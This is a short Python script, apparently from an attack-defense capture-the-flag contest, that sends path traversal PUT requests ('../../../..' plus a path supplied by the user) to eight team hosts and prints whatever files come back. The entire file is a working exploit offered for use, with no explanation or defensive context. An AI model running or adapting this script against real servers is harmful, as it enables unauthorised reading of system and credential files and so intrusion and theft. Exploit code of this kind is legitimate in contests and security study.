from requests import Request, Session

import sys

this, root_path = sys.argv

for team_num in range(1,9):
    print("Trying team {}".format(team_num))
    try:
        url = 'http://team{}.hf/../../../..{}'.format(team_num, root_path)
        s = Session()
        req = Request('PUT', url,
            data={},
            headers={},
        )

        prepped = s.prepare_request(req)
        resp = s.send(prepped)
    
        print("############## TEAM {} ###############".format(team_num))
        print(resp.text)
        print("############## TEAM {} END ###############".format(team_num))
    except Exception:
        print("Error getting for team {}".format(team_num))
